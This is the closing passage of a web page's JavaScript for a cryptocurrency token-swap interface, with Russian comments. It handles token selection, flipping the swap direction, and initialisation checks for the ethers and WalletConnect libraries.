                tokenSearchInput.value = '';
                renderTokenList('');
                openModal(tokenModal);
            });
            tokenSearchInput.addEventListener('input', function() {
                renderTokenList(this.value);
            });

            swapArrow.addEventListener('click', function() {
                const temp = fromToken;
                fromToken = toToken;
                toToken = temp;
                fromIcon.src = fromToken.img;
                fromSymbol.textContent = fromToken.symbol;
                toIcon.src = toToken.img;
                toSymbol.textContent = toToken.symbol;
                updateRateAndOutput();
                setStatus('Tokens flipped', '');
            });

            // ===== ИНИЦИАЛИЗАЦИЯ =====
            async function init() {
                await forceClearSession();
                updateConnectButton();
                setStatus('Connect wallet to start swapping', '');
                await updateRateAndOutput();

                if (typeof ethers === 'undefined') {
                    setStatus('❌ ethers library not loaded', 'err');
                } else {
                    console.log('Ethers loaded');
                }

                let WC = window.WalletConnectProvider;
                if (WC && WC.default) WC = WC.default;
                if (!WC || typeof WC.init !== 'function') {
                    console.warn('WalletConnect not loaded or invalid');
                    // не блокируем, так как будет попытка загрузить при подключении
                } else {
                    console.log('WalletConnect loaded');
                }

                const params = new URLSearchParams(window.location.search);
                if (params.has('nocache') || params.has('reset')) {
                    const cleanUrl = window.location.pathname + window.location.hash;
                    window.history.replaceState({}, document.title, cleanUrl);
                }
            }

            init();

        })();
    </script>
</body>
</html>
